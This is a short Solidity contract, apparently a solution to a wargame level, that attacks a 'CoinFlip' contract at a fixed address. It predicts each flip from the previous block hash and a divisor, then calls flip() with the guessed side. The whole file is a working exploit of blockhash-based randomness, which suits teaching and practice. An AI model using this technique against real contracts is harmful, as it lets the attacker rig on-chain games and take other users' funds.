// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './CoinFlip.sol';

contract CoinFlipAttack {

    // CoinFlip instance address
    address public coinflip = 0xE665dD6692d9a77C1a90FB5dCC83cd1Eb356b56b;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // CoinFlip SafeMath functions are not needed to execute an attack
    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(coinflip).flip(side);
    }

}